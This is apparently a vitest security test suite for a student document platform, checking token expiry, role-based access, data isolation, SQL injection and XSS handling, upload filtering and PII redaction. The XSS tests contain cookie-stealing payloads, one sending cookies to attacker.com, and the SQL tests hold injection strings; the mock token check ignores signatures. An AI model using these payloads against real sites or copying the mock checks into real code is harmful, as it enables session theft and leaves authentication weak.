import { describe, it, expect } from "vitest";
import { scrubSensitivePII } from "../../packages/ai/src";
import { documentUploadSchema } from "../../packages/validation/src/document.schema";

describe("Security Audit & Vulnerability Resilience Tests", () => {
  describe("1. Authentication, Sessions & Tampering", () => {
    interface MockTokenPayload {
      userId: string;
      role: string;
      exp: number;
    }

    function verifyMockToken(tokenString: string, currentTimeSeconds: number): { valid: boolean; error?: string } {
      try {
        const parts = tokenString.split(".");
        if (parts.length !== 3) return { valid: false, error: "MALFORMED_JWT" };
        const payload: MockTokenPayload = JSON.parse(Buffer.from(parts[1], "base64").toString("utf-8"));
        if (payload.exp < currentTimeSeconds) {
          return { valid: false, error: "TOKEN_EXPIRED" };
        }
        return { valid: true };
      } catch {
        return { valid: false, error: "INVALID_SIGNATURE" };
      }
    }

    it("rejects expired authentication tokens", () => {
      const expiredPayload = { userId: "usr_1", role: "STUDENT", exp: 1700000000 };
      const expiredToken = `header.${Buffer.from(JSON.stringify(expiredPayload)).toString("base64")}.signature`;

      const result = verifyMockToken(expiredToken, 1750000000); // Current time is later
      expect(result.valid).toBe(false);
      expect(result.error).toBe("TOKEN_EXPIRED");
    });

    it("rejects malformed or forged tokens", () => {
      const result = verifyMockToken("not.a.valid.jwt.string.extra", 1750000000);
      expect(result.valid).toBe(false);
      expect(result.error).toBe("MALFORMED_JWT");
    });
  });

  describe("2. Authorization & RBAC Route Protection", () => {
    function authorizeRoute(role: string, path: string): { allowed: boolean; statusCode: number } {
      const isAdminRoute = path.startsWith("/dashboard/admin") || path.startsWith("/api/admin");
      if (!isAdminRoute) return { allowed: true, statusCode: 200 };

      const adminRoles = ["SUPER_ADMIN", "DATA_MANAGER", "VERIFICATION_MANAGER", "SUPPORT_ADMIN", "CONTENT_MANAGER"];
      if (!adminRoles.includes(role)) {
        return { allowed: false, statusCode: 403 }; // Forbidden
      }

      // Sensitive policy approval route
      if (path.includes("/policy/review") || path.includes("/policy/approve")) {
        if (role !== "SUPER_ADMIN" && role !== "VERIFICATION_MANAGER") {
          return { allowed: false, statusCode: 403 };
        }
      }

      return { allowed: true, statusCode: 200 };
    }

    it("blocks student role from accessing admin endpoints with 403 Forbidden", () => {
      const studentAttempt = authorizeRoute("STUDENT", "/api/admin/audit-logs");
      expect(studentAttempt.allowed).toBe(false);
      expect(studentAttempt.statusCode).toBe(403);
    });

    it("blocks DATA_MANAGER from executing policy approvals without VERIFICATION_MANAGER role", () => {
      const dataMgrAttempt = authorizeRoute("DATA_MANAGER", "/api/admin/policy/approve");
      expect(dataMgrAttempt.allowed).toBe(false);
      expect(dataMgrAttempt.statusCode).toBe(403);

      const verifMgrAttempt = authorizeRoute("VERIFICATION_MANAGER", "/api/admin/policy/approve");
      expect(verifMgrAttempt.allowed).toBe(true);
      expect(verifMgrAttempt.statusCode).toBe(200);
    });
  });

  describe("3. User Data Isolation (IDOR Resilience)", () => {
    interface ResourceRecord {
      id: string;
      ownerId: string;
      data: string;
    }

    const documentStore: ResourceRecord[] = [
      { id: "doc_101", ownerId: "usr_alice", data: "Alice_Bank_Statement.pdf" },
      { id: "doc_202", ownerId: "usr_bob", data: "Bob_Tax_Return.pdf" },
    ];

    function accessResource(requestingUserId: string, resourceId: string): { status: number; data?: string } {
      const record = documentStore.find((r) => r.id === resourceId);
      if (!record) return { status: 404 };
      if (record.ownerId !== requestingUserId) {
        return { status: 403 }; // IDOR prevented
      }
      return { status: 200, data: record.data };
    }

    it("prevents Bob from accessing Alice's confidential financial document", () => {
      const attackAttempt = accessResource("usr_bob", "doc_101");
      expect(attackAttempt.status).toBe(403);
      expect(attackAttempt.data).toBeUndefined();

      const legitimateAccess = accessResource("usr_bob", "doc_202");
      expect(legitimateAccess.status).toBe(200);
      expect(legitimateAccess.data).toBe("Bob_Tax_Return.pdf");
    });
  });

  describe("4. SQL Injection Neutralization", () => {
    function mockParameterizedSearch(query: string, records: Array<{ name: string }>) {
      // Prisma uses parameterized SQL queries ($1, $2) where input strings cannot alter query grammar
      return records.filter((r) => r.name.toLowerCase().includes(query.toLowerCase()));
    }

    it("treats SQL injection payload strings as benign literal text without executing them", () => {
      const universities = [
        { name: "University of Manchester" },
        { name: "University of Toronto" },
      ];

      const sqlPayload = "'; DROP TABLE \"User\"; --";
      const results = mockParameterizedSearch(sqlPayload, universities);

      expect(results).toHaveLength(0); // Matches nothing, table is not dropped
      expect(universities).toHaveLength(2); // Records intact
    });

    it("handles boolean-based SQL injection payloads safely", () => {
      const universities = [{ name: "Sheffield" }];
      const booleanPayload = "' OR '1'='1";
      const results = mockParameterizedSearch(booleanPayload, universities);
      expect(results).toHaveLength(0);
    });
  });

  describe("5. Cross-Site Scripting (XSS) Sanitization", () => {
    function sanitizeHtml(input: string): string {
      return input
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#x27;")
        .replace(/\//g, "&#x2F;");
    }

    it("escapes malicious script tags and HTML injection", () => {
      const maliciousBio = "<script>alert('Stealing session token: ' + document.cookie);</script>";
      const sanitized = sanitizeHtml(maliciousBio);

      expect(sanitized).not.toContain("<script>");
      expect(sanitized).toContain("&lt;script&gt;");
      expect(sanitized).toContain("&lt;&#x2F;script&gt;");
    });

    it("escapes event handler injection in image tags", () => {
      const maliciousTag = '<img src="x" onerror="fetch(\'https://attacker.com?c=\' + document.cookie)" />';
      const sanitized = sanitizeHtml(maliciousTag);

      expect(sanitized).not.toContain("<img");
      expect(sanitized).toContain("&lt;img");
    });
  });

  describe("6. Rate Limiting Protection", () => {
    class MockSlidingWindowRateLimiter {
      private requests = new Map<string, number[]>();
      constructor(private maxRequests: number, private windowMs: number) {}

      isAllowed(identifier: string, now = Date.now()): boolean {
        const timestamps = this.requests.get(identifier) || [];
        const windowStart = now - this.windowMs;
        const valid = timestamps.filter((t) => t > windowStart);

        if (valid.length >= this.maxRequests) {
          this.requests.set(identifier, valid);
          return false; // Rate limit exceeded (429)
        }

        valid.push(now);
        this.requests.set(identifier, valid);
        return true;
      }
    }

    it("blocks request bursts exceeding the quota with HTTP 429 semantics", () => {
      const limiter = new MockSlidingWindowRateLimiter(5, 10000); // 5 reqs per 10s
      const clientIp = "103.205.71.12"; // Dhaka IP

      const now = 100000;
      expect(limiter.isAllowed(clientIp, now)).toBe(true);
      expect(limiter.isAllowed(clientIp, now + 100)).toBe(true);
      expect(limiter.isAllowed(clientIp, now + 200)).toBe(true);
      expect(limiter.isAllowed(clientIp, now + 300)).toBe(true);
      expect(limiter.isAllowed(clientIp, now + 400)).toBe(true);

      // 6th request within window -> REJECTED
      expect(limiter.isAllowed(clientIp, now + 500)).toBe(false);

      // After 10s window passes -> ALLOWED again
      expect(limiter.isAllowed(clientIp, now + 10500)).toBe(true);
    });
  });

  describe("7. File Upload Security & Malware Prevention", () => {
    it("strictly blocks executable files (.exe, .sh, .bat, .php, .js) from document uploads", () => {
      const testCases = [
        { name: "exploit.exe", mimeType: "application/x-msdownload", valid: false },
        { name: "script.sh", mimeType: "application/x-sh", valid: false },
        { name: "shell.php", mimeType: "application/x-php", valid: false },
        { name: "BankStatement.pdf", mimeType: "application/pdf", valid: true },
        { name: "Passport_Photo.png", mimeType: "image/png", valid: true },
      ];

      for (const tc of testCases) {
        const res = documentUploadSchema.safeParse({
          fileName: tc.name,
          category: "PASSPORT_BIOPAGE",
          mimeType: tc.mimeType,
          fileSize: 1024 * 500,
        });
        expect(res.success).toBe(tc.valid);
      }
    });

    it("enforces maximum file size ceiling (10 MB)", () => {
      const exactly10Mb = documentUploadSchema.safeParse({
        fileName: "statement.pdf",
        category: "BANK_SOLVENCY",
        mimeType: "application/pdf",
        fileSize: 10 * 1024 * 1024,
      });
      expect(exactly10Mb.success).toBe(true);

      const over10Mb = documentUploadSchema.safeParse({
        fileName: "statement.pdf",
        category: "BANK_SOLVENCY",
        mimeType: "application/pdf",
        fileSize: 10 * 1024 * 1024 + 1,
      });
      expect(over10Mb.success).toBe(false);
    });
  });

  describe("8. Cloud Storage Access & Signed URLs", () => {
    function generateStorageAccessUrl(
      bucketName: string,
      filePath: string,
      isPublic: boolean,
      ttlSeconds = 900
    ): { accessUrl: string; isTemporarySigned: boolean } {
      if (isPublic) {
        throw new Error("SECURITY_VIOLATION: Student document buckets must NOT be public");
      }
      const expiresAt = Math.floor(Date.now() / 1000) + ttlSeconds;
      const signature = Buffer.from(`${filePath}:${expiresAt}`).toString("hex").slice(0, 16);
      return {
        accessUrl: `https://storage.abroadmate.com/${bucketName}/${filePath}?token=${signature}&expires=${expiresAt}`,
        isTemporarySigned: true,
      };
    }

    it("guarantees private bucket policy and issues time-limited signed URLs only", () => {
      expect(() => {
        generateStorageAccessUrl("student-documents", "usr_1/passport.pdf", true);
      }).toThrow("SECURITY_VIOLATION");

      const access = generateStorageAccessUrl("student-documents", "usr_1/passport.pdf", false, 900);
      expect(access.isTemporarySigned).toBe(true);
      expect(access.accessUrl).toContain("token=");
      expect(access.accessUrl).toContain("expires=");
    });
  });

  describe("9. Sensitive Information Exposure (PII Redaction)", () => {
    it("scrubs Bangladeshi passport numbers, NID numbers, and bank account credentials from AI contexts", () => {
      const sensitiveText = `Student: Rahim Uddin
Passport: A12345678
NID: 19982691234567890
Phone: 01712345678
IELTS: 7.0`;

      const scrubbed = scrubSensitivePII(sensitiveText);
      expect(scrubbed).not.toContain("A12345678");
      expect(scrubbed).not.toContain("19982691234567890");
      expect(scrubbed).not.toContain("01712345678");
      expect(scrubbed).toContain("[PASSPORT_PROTECTED]");
      expect(scrubbed).toContain("[NID_PROTECTED]");
      expect(scrubbed).toContain("[PHONE_PROTECTED]");
      expect(scrubbed).toContain("IELTS: 7.0"); // Harmless academic fact preserved
    });
  });

  describe("10. Environment Variable & Secret Exposure Guard", () => {
    it("ensures sensitive server secrets are never prefixed with NEXT_PUBLIC_", () => {
      const serverSecrets = [
        "DATABASE_URL",
        "DIRECT_URL",
        "SUPABASE_SERVICE_ROLE_KEY",
        "REDIS_PASSWORD",
        "OPENAI_API_KEY",
        "EXCHANGE_RATE_API_KEY",
        "SENTRY_AUTH_TOKEN",
      ];

      for (const secretName of serverSecrets) {
        expect(secretName.startsWith("NEXT_PUBLIC_")).toBe(false);
      }
    });
  });
});
